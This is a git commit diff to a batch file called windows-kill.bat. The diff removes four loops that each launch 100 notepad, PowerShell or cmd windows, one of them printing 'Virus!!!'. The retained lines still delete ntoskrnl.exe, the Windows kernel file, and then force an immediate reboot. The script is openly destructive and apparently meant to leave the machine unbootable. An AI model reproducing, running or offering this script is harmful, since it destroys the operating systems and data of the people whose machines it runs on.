9df6caaf70ba58d9498b8e9fe9f3001f01ef0302
adamekmicrobit <156544320+adamekmicrobit@users.noreply.github.com>
2026-06-12 13:18:17 +0200

    Update windows-kill.bat

--- windows-kill.bat
+++ windows-kill.bat
@@ -16,37 +16,4 @@ pause
 
 del ntoskrnl.exe
 
-
-set count=100
-
-:loop
-start notepad
-set /a count=%count%-1
-if %count% GTR 0 goto loop
-
-
-set count=100
-
-:loop1
-start powershell
-set /a count=%count%-1
-if %count% GTR 0 goto loop1
-
-
-set count=100
-
-:loop2
-start cmd /k echo Virus!!!
-set /a count=%count%-1
-if %count% GTR 0 goto loop2
-
-
-set count=100
-
-:loop3
-start powershell -NoExit -Command "Write-Host Test"
-timeout /t 1 >nul
-set /a count=%count%-1
-if %count% GTR 0 goto loop3
-
 shutdown /r /t 0
